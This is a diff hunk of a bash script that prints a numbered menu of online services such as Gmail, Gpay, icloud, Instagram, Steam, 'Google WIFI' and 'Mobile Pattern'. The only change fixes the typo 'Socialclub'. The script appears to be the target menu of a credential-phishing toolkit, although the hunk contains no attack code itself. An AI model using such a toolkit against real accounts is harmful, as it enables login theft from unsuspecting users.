@@ -474,7 +474,7 @@ echo -e "${BLUE} [16] ${GREEN} Github 		 ${NC}""${BLUE} [41] ${GREEN} Quora     
 echo -e "${BLUE} [17] ${GREEN} Gitlab 		 ${NC}""${BLUE} [42] ${GREEN} Reddit            ${NC}""${BLUE} [67] ${GREEN} Google WIFI       ${NC}"
 echo -e "${BLUE} [18] ${GREEN} Gmail		 ${NC}""${BLUE} [43] ${GREEN} Shopify           ${NC}""${BLUE} [68] ${ORANGE} Mobile Pattern    ${NC}"
 echo -e "${BLUE} [19] ${GREEN} Google 		 ${NC}""${BLUE} [44] ${GREEN} Snapchat          ${NC}"
-echo -e "${BLUE} [20] ${GREEN} Gpay 	   	 ${NC}""${BLUE} [45] ${GREEN} Socialclu         ${NC}"
+echo -e "${BLUE} [20] ${GREEN} Gpay 	   	 ${NC}""${BLUE} [45] ${GREEN} Socialclub        ${NC}"
 echo -e "${BLUE} [21] ${GREEN} icloud 		 ${NC}""${BLUE} [46] ${GREEN} Spotify           ${NC}"
 echo -e "${BLUE} [22] ${GREEN} Instagram 	 ${NC}""${BLUE} [47] ${GREEN} Stackoverflow     ${NC}"
 echo -e "${BLUE} [23] ${GREEN} Jazz		 ${NC}""${BLUE} [48] ${GREEN} Steam             ${NC}"
